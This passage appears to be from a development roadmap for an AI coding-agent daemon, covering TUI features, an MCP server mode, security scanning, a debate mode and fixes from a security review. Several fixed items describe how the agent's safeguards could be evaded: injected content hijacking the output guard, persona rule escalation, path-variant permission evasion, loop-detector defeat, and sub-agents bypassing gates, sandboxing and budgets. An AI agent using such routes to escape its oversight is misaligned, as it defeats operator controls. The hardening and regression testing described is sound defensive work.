`compaction.pruneStaleToolResults` (`internal/compaction/prune.go`) runs as a deterministic pre-pass inside `Summarizer.Compact`, before any LLM call: `read_file` results for a path that was read again later are blanked to a one-line marker, and large `grep`/`glob`/`ls` dumps outside the trailing `keepRecent` window are truncated to a short preview. Never touches conversational text, tool errors, or the recent window. If pruning alone brings the estimate back under budget, `Compact` returns immediately — no summarizer call, no LLM cost.

</details>

<details>
<summary><strong>P6.3 — MCP server mode, shipped 2026-07-05</strong></summary>

New `internal/mcpserver` package + `aegis mcp-serve`: exposes the Aegis daemon as an MCP server over stdio, the reverse direction of the existing `mcp:` client config (which lets Aegis call _out_ to external MCP servers). Rolls its own minimal JSON-RPC 2.0 dispatcher (request/notification, no server-initiated calls needed) rather than sharing `internal/acp`'s — same precedent as `internal/mcp`'s client-side loop already being separate from ACP's.

- Three tools exposed: `aegis_prompt` (delegate a task to a session and block for the full turn, returning the final assistant text plus a `[session: <id>]` marker to continue the conversation), `aegis_new_session`, and `aegis_list_sessions`. All three are thin translations onto the existing daemon HTTP API (`client.Client`), exactly how `internal/acp`'s agent already works — no new server-side session/engine plumbing.
- Safety posture is deliberately conservative since an MCP `tools/call` is synchronous with no human in the loop: new sessions default to **plan mode** (`mcp_server.default_mode`, not the daemon's own build default) and any approval request that does arise (a caller explicitly asked for build/auto) is **denied** unless `mcp_server.auto_approve` (or `--auto-approve`) is set.
- **Scope decisions kept deliberately narrow:** individual built-in tools (`security_scan`, `read_file`, etc.) are not exposed 1:1 as MCP tools bypassing the agent loop — undone follow-up, not an oversight. `notifications/cancelled` is not propagated to an in-flight `aegis_prompt` call.
- Verified end-to-end against a real running daemon (built the binary, drove `aegis mcp-serve` over stdio by hand: `initialize` → `tools/list` → `tools/call aegis_new_session`/`aegis_list_sessions`), not just unit-tested.

Tests: `internal/mcpserver/server_test.go` (14 cases: initialize, tools/list schema shape, prompt session-create vs. reuse, approval deny-by-default vs. auto-approve, error propagation, empty/populated session listing, unknown tool/method, notification-gets-no-response). Docs: `docs/cli-reference.md`, `docs/configuration.md`, `CLAUDE.md`.

</details>

<details>
<summary><strong>TQ — TUI Quality Track, all 11 items shipped (complete 2026-07-03)</strong></summary>

A code-level review of `internal/tui` against the Claude Code and opencode/Crush TUI experience found the recurring gap: Aegis rendered the conversation as one append-only styled string (`cappedBuffer` + wrap caches), while the streamlined harnesses model it as a list of typed message blocks rendered and cached individually. TQ1 fixed that structural gap; the rest is diff quality, streaming markdown, and interaction polish.

| #      | Item                                                                                                                                                                                                                                                                                                                                                                                                                             | Shipped    |
| ------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| TQ1    | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line.                                                    | 2026-07-02 |
| TQ2    | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all.                                                                                                                                                                                                                                                                   | 2026-07-02 |
| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation.                                                                                                                                                                                                                                                                            | 2026-07-02 |
| TQ5    | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden.                                                                                                                                                                                                                                                                            | 2026-07-02 |
| TQ7    | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text.                                                                                                                                                                                                                                                                             | 2026-07-02 |
| TQ3    | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop".                                                                                                                                                     | 2026-07-03 |
| TQ9    | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand).                                                             | 2026-07-03 |
| TQ8    | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue.                                                                                                                                                                                      | 2026-07-03 |
| TQ6    | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
| TQ10   | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme.                                                                                                                                            | 2026-07-03 |

Remaining cosmetic stretch ideas (not scheduled): TQ4c scoped mouse capture, terminal-background auto-detection for theme selection.

</details>

<details>
<summary><strong>Architecture/security review punch list — all 15 items shipped 2026-07-04</strong></summary>

Fixes for every item in `research/architecture-security-review-2026-07-03.md`'s prioritized punch list, an adversarial fresh-context review (five independent passes) run specifically to find interaction bugs between individually-correct features — the class of bug a checklist re-verification against P7/P8/P9 structurally can't catch. All 15 shipped in priority order; full test suite green throughout.

1. **Persona `rules:` escalation** — `server.filterPersonaRules` (new, `internal/server/server.go`) strips `Allow` rules from a loaded (untrusted) persona before merging into the session rule set, same trust gate `resolveSessionMode` already applied to `Mode` (P7.5). Deny rules pass through unchanged (narrowing access carries no escalation risk).
2. **Persona `output_guard: none` escalation** — `outputGuardConfig` now ignores `Guard.Disabled` from a loaded persona (logs a warning instead), closing the same class of gap for the last safety net.
3. **Unrecovered tool-panic crashes the daemon** — `engine.runTools`' per-call goroutine now `recover()`s a panic and reports it as an ordinary tool error, instead of taking down every concurrent session.
4. **Sub-agent fan-out multiplies spend** — a shared `*cost.Tracker` rides the run's `ctx` (`swarm.WithCostTracker`/`CostTrackerFromContext`) so every sub-agent at any depth (including background/detached spawns, and workflow-mode fan-out) draws against one `BudgetUSD` ceiling; `agent.go` also caps a `parallel` workflow at `maxParallelAgents` (8).
5. **Rewind races an in-flight turn** — `handleRewind` now acquires the same per-session semaphore `handlePostMessage` does, so a rewind can never truncate messages a concurrent turn is about to append to.
6. **Permission rules matched raw paths** — `permission.Rule` gained a `rePath` matcher; `normalizePathLike` (separator-unify + lexical clean + case-fold on case-insensitive OSes) closes the `./secrets/x`, case-variant, and backslash-vs-forward-slash evasions for Read/Write-capability rules.
7. **Transcript persistence wasn't actually incremental** — `handlePostMessage`'s `flushMessages` closure now runs on every `KindTurnDone`/`KindTrace` event (after each tool round), not once at the very end, so a crash mid-run loses at most the in-flight model call.
8. **Guard fails open on ambiguous verdicts + no injection hardening** — `parseVerdict` now fails _closed_ on an unparseable reply (an actual transport error still fails open); `LLMGuard` wraps judged content in `<output>`/`<file>` tags with `escapeForGuard` neutralizing embedded angle brackets, so injected content can't forge a fake closing tag and splice in "instructions."
9. **MCP read loops die silently on oversized/malformed input** — `readLoop`/`listenSSE` scanners raised to `maxMCPScanTokenBytes` (8 MiB, from bufio's 64KB default); `Client.failPending` fails every in-flight and future call immediately once the read loop exits, instead of hanging forever on a dead connection.
10. **OpenAI reasoning models get the wrong token-limit field** — `isReasoningModel` routes o1/o3-class models (including vendor-prefixed ids) to `max_completion_tokens` instead of `max_tokens`, which those models reject outright.
11. **OS sandbox overstates its guarantee** — `docs/security.md`/`docs/configuration.md` now document (and `OSBackend`'s doc comment states) that seatbelt/bwrap confine writes and network only, not reads — a materially weaker claim than the container backend's full isolation.
12. **Budget dead zones + loop-detector blind spot** — the budget check now runs at the top of every engine iteration (covering guard retries and max-token continuations, not just the pre-tool-round path); `loopDetector` generalizes from "last N identical" to cycle detection up to period 4 (catches an alternating A/B pattern), and `turnSignature` canonicalizes tool input (normalizing timestamp/UUID/nonce-shaped scalars) so a single varying byte can't defeat it.
13. **Tool exposure/subprocess/mailbox isolation gaps** — `tool.Registry.Clone()` + a per-session registry (`Server.sessionToolRegistry`) scope `tool_search` loads to the requesting session instead of exposing process-wide; subprocess swarm workers get a process group (`Setpgid`) plus Linux `Pdeathsig`/Windows Job Object (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) so an abnormal daemon death doesn't orphan them; `Mailbox.MarkRead` now evicts `processed/` entries older than `processedRetention` (7 days).
14. **Embedding provenance / prune-by-age / checkpoint scope** — `mem_vec`/`docs_vec` gained a `model` column (`embed.Embedder` gained `Model()`); a stored vector from a different model is excluded from cosine ranking rather than silently compared. `compaction.pruneStaleToolResults` now only prunes a `grep`/`glob`/`ls` dump once verified superseded by an identical later call (mirrors the existing `read_file` re-read check), not merely by turn age. Checkpoint capture now reaches subprocess-mode sub-agents: `SpawnConfig.CheckpointID` + `WorkerSpec.SessionDBPath` let the worker process open its own connection to the same session db and reconstruct an equivalent `Snapshotter`.
15. **Adversarial eval suite** — `internal/eval/adversarial_test.go` (new) extends the P9.1 harness (`GuardEvents`/`ExpectGuardFailureContains` added to `eval.go`) with four full-engine scenarios: a judge-adapter proving injected file content can't hijack the output guard, a permission rule proving a `./`-traversal evasion is still blocked, loop detection proving a nonce-varying tool call still trips, and the budget gate proving a stuck guard-retry loop still aborts.

Tests: every fix above shipped with its own regression test (permission/rules_test.go, engine/parallel_test.go, engine/budget_test.go, engine/loopdetect_test.go, tool/deferred_test.go, tool/builtin/{agent,toolsearch}\_test.go, mcp/mcp_test.go, provider/openai/openai_test.go, guard/guard_test.go, server/{server_guard,server_checkpoint}\_test.go, swarm/mailbox_test.go, longmem/knowledge_test.go, compaction/prune_test.go, cli/worker_test.go, eval/adversarial_test.go) plus the new adversarial eval suite exercising several fixes together end-to-end. Full `go test ./...` green (48 packages).

</details>

<details>
<summary><strong>P10 — Sub-agent Security Parity, all 5 items shipped 2026-07-04</strong></summary>

A service-interaction review traced how a top-level session's security posture propagates across the `agent` delegation seam into a spawned teammate, and found neither swarm backend inherited it: `server.newEngine` composes the real gate stack for a top-level run (`RuleGate` → `ContextualGate` → `PersonaToolGate` → mode gate), but `subAgentRunner` (in-process) and `executeWorker` (subprocess) both rebuilt only a bare mode gate from scratch. Mode clamping still held in both paths, so a sub-agent couldn't _escalate_ plan→build→auto — what leaked was everything finer-grained than mode.

- **P10.1 (in-process bypass):** `subAgentRunner` skipped the contextual-egress and text allow/deny rule wrapping entirely — a spawned teammate's `web_fetch`/`curl` calls ignored an operator's `egress_then_write`/deny rules. Fixed by factoring gate assembly out of `newEngine` into `(*Server).buildGate(mode, approver, persona)`, reused by both the top-level and sub-agent paths.
- **P10.2 (subprocess unsandboxed + same gate bypass):** `executeWorker` built its tool registry with no `Sandbox` at all (so a configured container/os sandbox was silently never honored for subprocess workers) and the identical bare-mode-gate bypass as P10.1. Fixed via newly-exported `server.SelectSandbox` plus layering the same contextual/rule gates, independently re-loaded from config since a subprocess has no access to the daemon's in-memory state.
- **P10.3 (subprocess budget multiplication):** each subprocess worker got a fresh full `BudgetUSD` instead of sharing the parent's ledger (which can't ride `ctx` across a process boundary), so N teammates enforced N× the intended ceiling. Fixed with a `RemainingBudgetUSD`/`RemainingTokens` handoff on `WorkerSpec`, sized against the shared tracker at spawn time, and `cost.Tracker.AddWorkerCost` folding each worker's self-reported spend back before the next sibling spawns.
- **P10.4 (no eval coverage for the delegation seam):** landed as a regression test alongside each P10.1–P10.3 fix rather than a new `internal/eval` scenario — that harness has no natural seam for spawning a _real_ sub-agent through either swarm backend.
- **P10.5 (dollar budget silently no-ops for local models):** prompted by a comparison to how cloud providers budget in tokens, not dollars. `internal/cost` derived USD from a pricing catalog and collapsed to `$0` for local/Ollama (estimated-usage) turns and any uncatalogued model — meaning the local-first deployment case had, in practice, no working spend guardrail. `cost.Tracker` gained `AddTokens`/`TotalTokens` (accumulate regardless of pricing/estimation); new `MaxTokensPerRun`/`session_token_cap`/`daily_token_cap` give a token-denominated primary budget that works everywhere, with the dollar caps remaining a cloud-only convenience layered on top.

Tests: `internal/server/server_subagent_test.go`, `internal/cli/worker_test.go`, `internal/swarm/subprocess_test.go`, `internal/cost/cost_test.go`, `internal/engine/budget_test.go`, `internal/session/session_test.go`, `internal/server/server_test.go`.

</details>

<details>
<summary><strong>P11 — Security Scanning Depth, all 12 items shipped 2026-07-04</strong></summary>

A user request to bring `internal/security`/`aegis scan`/`security_scan` — three host-installed binaries (semgrep `auto`, trivy `fs`, gitleaks) behind one normalized `Finding` model — up to best-in-class OSS coverage across SAST/SCA/container/IaC/DAST. Three structural gaps drove the track: shallow breadth, `Scanner.Available()` silently skipping any tool not on `PATH` (a clean machine reported a clean scan it never ran), and no dynamic (running-app) testing.

- **P11.1 (containerized scanner runtime, keystone):** `Scanner.Resolve` decides host-binary vs. pinned-container-image vs. unavailable — never a silent skip. Ships with **no built-in image pin** by deliberate choice: a scanner image is itself supply-chain surface, and this codebase has no way to verify a _current_ digest at commit time, so an operator pins one themselves (`security.tools.<name>.image`, digest required, see `docs/security.md`'s pin recipe).
- **P11.2 (SARIF-first normalization):** one shared `ParseSARIF` ingester (`internal/security/sarif.go`) replaces per-tool bespoke parsers for every SARIF-emitting scanner; only gitleaks (not SARIF-native) keeps a hand-written one.
- **P11.3 (SAST depth):** opengrep (no-login, no-telemetry community fork) is the new default SAST engine, semgrep selectable; both use pinned rule packs, never `--config auto`. Four opt-in language engines added (gosec/bandit/brakeman/njsscan), which required a real default-enablement mechanism (`ScannerDescriptor.DefaultEnabled`) so opt-in tools don't silently turn themselves on the moment they ship.
- **P11.4 (SCA depth + SBOM):** osv-scanner added as a new SARIF-native SCA scanner; grype's directory scan now prefers matching against a syft-generated CycloneDX SBOM (persisted to `.aegis/sbom.cdx.json`) over its own cataloger, falling back cleanly if syft is unavailable.
- **P11.5 (container image security, scoped):** new `ImageScanner`/`ScanImage` entry point (trivy image, grype, dockle, hadolint). Host-binary only for now — pulling a registry image needs network egress, which the shared container-fallback runner deliberately denies (`--network none`); a network-enabled container path is real, undone follow-up.
- **P11.6 (IaC scanning):** trivy's misconfig scanning made explicit (`--scanners vuln,secret,misconfig`); kubescape added for deeper K8s analysis — not checkov, whose OSS CLI emits no severity and would collapse to INFO in the severity-ranked model.
- **P11.7 (DAST via OWASP ZAP, v1 scope):** runs ZAP's Automation Framework (not the packaged baseline/full/api scripts) since only its `report` job can emit SARIF. Container-only, and target authorization is a **hard, code-enforced gate independent of permission mode**: loopback/RFC-1918 always allowed, anything else needs an explicit allowlist entry, and active/attack modes need a separate `allow_active` opt-in. v1 requires an already-running target; v2 ("build the target + scan it on one ephemeral network") not done.
- **P11.8 (dedup, ASVS mapping, suppression baseline):** `DedupFindings` collapses the same CVE/rule flagged by multiple tools into one finding (tagging every tool that also caught it via `SeenBy`); a curated CWE→OWASP-ASVS table tags a best-effort standards chapter automatically across every SARIF tool with zero per-tool work; an optional `.aegis/security-baseline.yaml` lets an operator suppress a specific accepted-risk finding with a **mandatory expiry** (expired/invalid entries are flagged, never silently honored — a broken baseline fails safe). The `security-audit` skill was extended to use these signals and, when asked to fix rather than review, re-scan after a fix to confirm it closed before claiming success (P4.8's close-the-loop posture applied to security remediation).
- **P11.9 (regression evals + provenance):** a golden-transcript test (`internal/security/regression_test.go`) drives the full pipeline over recorded fixtures with no scanner/network/container needed in CI, proving the P11.8 cross-tool dedup and all three baseline states end to end. Also closed a real gap found while implementing it: a configured scanner image was never actually validated as digest-pinned despite being documented as required — floating tags are now rejected (`digestPinReason`). A live ZAP capture against Juice Shop/WrongSecrets/VAmPI is documented follow-up in `testdata/README.md`, since no container runtime was available to run one this pass.
- **P11.10 (guided scanner install):** approval-gated per-tool install (`aegis security install <tool>`) — shows the exact command and requires confirmation before ever touching the host; supply-chain hygiene favors package managers/checksummed binaries over `curl | sh`.
- **P11.11 (security tool config + `/security-config`):** `security.tools.<name>` config (enabled/method/install/image) plus an interactive TUI form, so none of this requires hand-editing YAML.
- **P11.12 (reachability analysis):** osv-scanner's `--call-analysis` (govulncheck-backed for Go, on by default) surfaces whether a vulnerable dependency's flagged code is actually _called_, not just present in the dependency tree — never inferred for unsupported ecosystems, since a wrong "unreachable" claim would understate real risk.
- **Follow-up, 2026-07-05 — install-from-wizard + `/scan`:** `/security-config` gained an action step per tool (Edit settings / **Install now (guided)** / Back) that runs the same confirmed guided install `aegis security install` does (factored into a shared `security.RunGuidedInstall`), then re-resolves availability so the list reflects the newly-installed binary without leaving the dialog. New `/scan [path|image <ref>|sbom [path]]` TUI command runs a scan directly against the daemon's workspace (`POST /security/scan`, new endpoint) and prints the report — no model turn spent, mirroring `aegis scan`.

**Scope decisions kept deliberately narrow rather than over-built** (each a documented trade-off, not an oversight): no built-in image digest pins (P11.1); image scanning is host-binary only (P11.5); DAST v1 needs an already-running target (P11.7); the ZAP regression fixture is an explicitly labeled synthetic placeholder pending a live capture (P11.9); OWASP Dependency-Check remains opt-in-only with no built integration, no concrete demand yet (P11.4).

Tests: `internal/security/{method,sarif,scanners,sast,sbom,osv,dast,dedup,asvs,baseline,regression,security,install}_test.go`, `internal/cli/security_test.go`, `internal/config/write_security_test.go`, `internal/tui/{securityconfig,scan}_test.go`, `internal/server/scan_test.go`.

</details>

<details>
<summary><strong>P12 — Multi-Agent Debate Mode for Security Analysis, all 7 items shipped 2026-07-05</strong></summary>

A security task (threat model entry, scan-finding triage, design review) can now run as a multi-agent debate — propose → critique → rebut → arbitrate — over Aegis's existing swarm substrate, with one Ollama model instance playing every role via persona-based differentiation (no cast of distinct models required).

- **P12.1 (debate primitive, keystone):** new `internal/debate` package, decoupled from `internal/swarm`/`internal/engine` the same way swarm stays decoupled from the engine. `debate.Run(ctx, claim, Config, RunFunc)` drives up to `MaxRounds` (default 2) rounds of critique → rebuttal against a caller-supplied `RunFunc` (system+user prompt → text), then always closes with an arbiter call over the full transcript, returning a `Transcript` with a parsed `Verdict` (`OUTCOME` + `CONFIDENCE`).
- **P12.2 (debate roles as personas):** two new built-in personas, `security-critic` (adversarial, must cite retrievable evidence — `security_scan`/`grep`/`read_file` file:line — or reply `CONCEDE`) and `security-arbiter` (synthesis-only, minimal `Tools: [remember]`, outputs a fixed `VERDICT/CONFIDENCE/REASON` format). Resolved via `persona.Get(name).System` directly (not `internal/agentdef`) so they're addressable like any other persona (`aegis persona show security-critic`) and overridable per call via `critic_persona`/`arbiter_persona`.
- **P12.3 (evidence grounding):** `debate.hasEvidence` (regex-based citation heuristic — deliberately loose, not a hard verifier) tags each round `[evidence cited]` or `[unsubstantiated]` in the rendered transcript; the arbiter persona is instructed to treat unsubstantiated rounds as noise when reaching a verdict.
- **P12.6 (budget bounds):** `debate.Config` carries an optional shared `*cost.Tracker` plus `BudgetUSD`/`MaxTokens`; `budgetExhausted` (checked before every round, 90% headroom) short-circuits straight to arbitration over whatever transcript exists so far rather than let a debate silently multiply spend across three role-spawns per round the way plain sub-agent fan-out could before P10.3.
- **P12.4 (surfacing):** `agent` tool gained `mode:"debate"` (claim/proposer_persona/critic_persona/arbiter_persona/max_rounds args; depth-guarded, spawns each role via the existing `swarm.Backend`); `POST /debate` HTTP endpoint (session-less — builds a bare `engine.New` per role call rather than reusing the swarm-identity-bearing `subAgentRunner`); TUI `/debate <claim>` slash command; `aegis debate <claim>` headless CLI (mirrors `aegis chat`'s direct adapter/registry/engine construction, one shared cost tracker across role calls).
- **P12.5 (workflow integration, opt-in):** `security.debate.threat_model` / `security.debate.triage` config toggles (both default `false`). When either is on, `effectiveSystem()` injects a small "## Debate mode (P12)" block into the session prompt; the `security-architect` persona's threat-modeling workflow and the `security-audit` skill's triage loop both reference that injected block by name to decide whether to route a threat/finding through `mode:"debate"` before finalizing severity/suppression — keeps the actual gating data-driven (live config) while the instruction text authored in the static persona/skill stays unconditional.
- **P12.7 (eval coverage, scope decision):** followed the P10.4 precedent — `internal/eval` has no natural seam for a Scenario that triggers a real sub-agent spawn (it scripts one engine's adapter, not tool-triggered spawns). Satisfied via regression tests at three levels instead of a new eval scenario: pure mechanism (`internal/debate`), real swarm-spawn path (`internal/tool/builtin`), real HTTP endpoint + engine (`internal/server`).

**Scope decisions kept deliberately narrow:** exactly three roles (proposer/critic/arbiter), no configurable role count; one model instance drives every role via persona system-prompt differentiation, not a multi-model cast; opt-in per task/config only — debate mode is never a silent default for threat modeling or triage.

Tests: `internal/debate/debate_test.go` (6 cases), `internal/tool/builtin/debate_agent_test.go` (5 cases), `internal/server/debate_test.go` (5 cases), `internal/cli/debate_test.go`, `internal/tui/debate_test.go`, plus `internal/persona/persona_test.go` coverage for the two new personas. Docs: `docs/multi-agent.md` (`#debate-p12`), `docs/personas.md`, `docs/cli-reference.md`, `docs/configuration.md`, `docs/security.md`, `CLAUDE.md`.

</details>

<details>
<summary><strong>P14.3 — In-session knowledge base & repo index (`/knowledge`, `/index`), shipped 2026-07-05</strong></summary>

`aegis knowledge index` (P3.3 project knowledge base) and `aegis index` (P2.3 repo map) were
CLI-only; the model already had `project_knowledge` and the injected `<repo_map>` block, but a user
driving the TUI had no way to trigger a rebuild or run a search without shelling out. Unlike
`/security`/`/sandbox` (which read the TUI process's own config/workspace directly, no daemon round
trip), `/knowledge` and `/index` go **through the daemon**: `s.knowledge` is one live `*knowledge.Store`
instance for the workspace (`sql.DB.SetMaxOpenConns(1)`), and a second connection opened directly from
the TUI process risks lock contention with the daemon's writer and can't refresh the daemon's cached
`<repo_map>` system-prompt block anyway — so both commands follow the `/scan`/`/debate` precedent
(daemon HTTP round trip) instead.

- New `POST /knowledge` (`api.KnowledgeRequest{Action: "index"|"query", Query, Limit}` →
  `api.KnowledgeResponse`): `"index"` calls `s.knowledge.Index` (same as `aegis knowledge index`) and
  returns `doc_count`/`db_path`/`embeddings_enabled`; `"query"` calls `s.knowledge.Search` (same as the
  `project_knowledge` tool) and returns the matched `path`/`title`/`snippet`/`score` results. 503 when
  `s.knowledge` is nil (store failed to open at startup); 400 for a missing query or an unrecognized
  action.
- New `POST /repomap/index` (`api.RepoMapIndexResponse{FileCount, Path}`): rebuilds via
  `repomap.Build(s.workspace, ...)`, saves the `.aegis/repomap.json` cache (same as `aegis index`), and
  — the part a bare CLI-equivalent handler wouldn't do — replaces the daemon's own cached
  `s.repoMap` under a new `repoMapMu` mutex, so the very next turn's system prompt picks up the
  refreshed map with no restart. `s.repoMap` had been a write-once-at-startup field read without
  synchronization; making it rebuildable at runtime turned it into genuinely shared mutable state, so
  `effectiveSystem`'s read was moved under the same mutex (mirroring the existing `permMu` pattern for
  `permRules`).
- `client.Client.Knowledge`/`RepoMapIndex` (`internal/client/client.go`) mirror `Scan`/`Debate`.
- `/knowledge [index|query <text>]` and `/index` (`internal/tui/slash.go`'s `cmdKnowledge`/`cmdIndex`)
  registered as two new `commandDef` entries (P14.10) — dispatch, `/help`, and the completion popup all
  picked them up automatically.
- Tests: `internal/server/knowledge_test.go` (index-then-query round trip against a real store proves
  an indexed README becomes searchable; missing-query and unknown-action rejection; 503 without a
  store; repomap rebuild proves both the on-disk cache and `effectiveSystem`'s output change), plus
  `internal/tui/knowledge_test.go` for the argument-validation fast paths that return before touching
  the client (bare `/knowledge`, `/knowledge query` with no text, unknown subcommand) — same
  division of labor as `scan_test.go`/`debate_test.go` (TUI tests cover argument parsing; the server
  package covers the actual daemon round trip).
- Verified manually end-to-end: started a real daemon against a scratch git repo with a README and a
  `.go` file, hit `/knowledge` (index → 9 docs, query "frobnication" → 1 match) and `/repomap/index`
  (2 files) over HTTP with the daemon's real bearer token, confirmed `.aegis/repomap.json` was written.
- P14.4, P14.6, P14.7, P14.8, and P14.9 all shipped 2026-07-06, closing out the P14 track (see their entries under P14 above).

</details>

<details>
<summary><strong>P14.1 + P14.10 — command-surface drift fix and its structural cure, shipped 2026-07-05</strong></summary>

Found during a cross-feature integration review (roadmap + codebase, focused on seams between
features rather than per-feature gaps) — the review's own hypothesis, that retrofitted capabilities
reliably miss one of several shared integration seams, was confirmed by this exact bug.

- **P14.1 (completion/palette drift):** `internal/tui/completion.go`'s `builtinCommands` (the
  completion-popup/command-palette source) was missing seven commands that were fully dispatchable
  via `d.builtins` and listed in `/help`: `security-config`, `scan`, `debate`, `rollback`, `detach`,
  `archive`, `humor`. `help_test.go` already guarded `d.builtins` against `/help`, but nothing
  guarded `builtinCommands` against either — so typing `/sec` surfaced nothing, which is why
  `/security-config` read as "not existing" to a user driving the TUI. Fixed by adding the seven
  entries (and to `commandsNeedingArgs`, where a trailing space helps); new guard test
  `TestBuiltinCommandsCoverDispatchTable` (`internal/tui/completion_test.go`) asserts
  `builtinCommands` covers every `d.builtins` key except the `quit` alias, mirroring the existing
  `TestSlashCommandsAreListedInHelp`.
- **P14.10 (structural cure, built same day rather than deferred):** new `internal/tui/commands.go`
  defines each built-in command exactly once as a `commandDef` (name, arg hint, short description,
  detailed help, `needsArgs`, and its handler as a method expression `(*SlashDispatcher).cmdX`).
  `NewSlashDispatcher`'s `d.builtins`, `cmdHelp`'s general listing, `builtinHelp`'s detailed
  `/help <name>` text, and `completion.go`'s `builtinCommands`/`commandsNeedingArgs` are all now
  derived from this one table (`commandDefs()`) instead of four independently hand-maintained
  lists — closing the entire drift class P14.1 fixed one instance of. `commandDefs` is a function,
  not a package-level `var`: a `var` whose initializer holds handler values that themselves range
  over that `var` is a genuine Go compile-time initialization cycle (dependency analysis follows
  through function bodies referenced in the initializer), so the table is rebuilt per lookup
  instead — negligible cost at ~26 entries, called only at dispatcher construction, `/help`, and
  popup population. New test `TestCommandDefsWellFormed` guards the table itself (no empty or
  duplicate names, every entry has a handler and both help strings).
- Tests: `internal/tui/completion_test.go` (`TestBuiltinCommandsCoverDispatchTable`,
  `TestCommandDefsWellFormed`), full existing `internal/tui` suite (`help_test.go`,
  `completion_test.go`) re-verified green against the refactor.

</details>

<details>
<summary><strong>Debate daily cost/token cap integration, shipped 2026-07-05</strong></summary>

A second instance of the same "new capability skips a shared seam" pattern P14.1 exemplified,
found by checking whether P12 (debate, shipped 2026-07-05) actually integrated with the P9.5/P10.5
cost-guardrail track (shipped 2026-07-03) rather than assuming shipped-and-tested meant
fully-integrated. It didn't: `handleDebate` (`internal/server/server.go`) built its own bare
`debate.Config`/tracker and only enforced the per-run `BudgetUSD`/`MaxTokensPerRun` — the
cross-session daily dollar and token caps (`Cost.DailyCapUSD`/`DailyTokenCap`) and the ledger writes
that make them work (`store.AddDailyCost`/`AddDailyTokens`) lived entirely inside
`handlePostMessage`, debate's sibling endpoint, and were never called from the debate path.
Consequences before the fix: a `/debate` call (up to ~7 model calls per run: proposer + critic/
rebuttal per round + arbiter) ran even with the daily cap already exhausted, its spend was invisible
to every later cap check (including the next normal session turn's), and — the case this matters
most for — the P10.5 token cap (the only *working* guardrail for local/Ollama models, where dollar
cost is $0) was bypassed entirely for debate runs.

- Extracted `(s *Server) checkDailyCaps(ctx) (dailyCostBefore, dailyTokensBefore, err)` and
  `(s *Server) recordDailySpend(costUSD, tokens)` out of `handlePostMessage`'s previously inlined
  daily-cap check/ledger-write logic (behavior unchanged there — same read-failure-is-non-fatal
  semantics, same "only write if a cap is configured" gating).
- `handleDebate` now calls `checkDailyCaps` before starting (refusing with 402 if either cap is
  already reached — no session cap applies, since debate is deliberately session-less) and
  `recordDailySpend(tracker.TotalUSD(), tracker.TotalTokens())` after `debate.Run` returns,
  unconditionally (even on error), since `debate.Run` returns the partial transcript — and whatever
  the tracker accumulated — before failing.
- Tests: `internal/server/debate_test.go` — `TestHandleDebateBlockedByDailyCostCap` (daily cap
  already exhausted refuses the call), `TestHandleDebateRecordsDailySpend` (a successful debate's
  cost lands in the same daily ledger a normal turn writes to, provable via `store.TodayCost`).
  Full existing `internal/server` cost-cap suite (`TestSessionCostCapBlocksTurn`,
  `TestDailyCostCapBlocksTurn`, `TestSessionTokenCapBlocksTurn`, `TestDailyTokenCapBlocksTurn`,
  `TestCostAlertThresholdFires`) re-verified green against the refactor.
- Not yet done, left as a natural follow-up rather than scope creep here: any *future* model-
  spending endpoint must remember to call these two helpers itself — there's no compiler-enforced
  guarantee the way P14.10 enforces the command-surface table, since Go has no "all HTTP handlers
  that call `engine.Run` must call X" constraint. Worth a comment at the routing table
  (`server.routes()`) flagging this the next time a spending endpoint is added.

</details>

<details>
<summary><strong>Misc audit notes</strong></summary>

- **P7 audit — reviewed and found sound, no action needed:** SSRF dialer (private-IP check happens at dial time, closing the DNS-rebind window); path traversal / symlink handling in `ValidatePath`; local daemon HTTP API (constant-time bearer token + loopback-origin check); persona YAML parsing (safe library, no unsafe type deserialization); `team_tasks` claim path (properly transactional, no duplicate-claim race).
- **2026-07-03 documentation audit:** cross-checked every P7.1–P7.7 and TQ-track "shipped" claim against the actual code (all confirmed; only P8's cited line numbers had minor drift, now corrected) and re-read `docs/*.md` against current behavior. Found and fixed real staleness: `docs/tui-guide.md`/`docs/permissions.md` still described the pre-TQ6 y/n/a approval banner instead of the current option-list dialog; the keyboard shortcut table was missing `Alt+Enter`/`Shift+Enter`/`Ctrl+O`/`Ctrl+X` and a correct `Esc` row; `docs/configuration.md`'s `tui:` block was missing the `theme` key entirely; the `Ctrl+X` embedded terminal pane (pre-existing) had never been documented. All fixed in place.

</details>

---

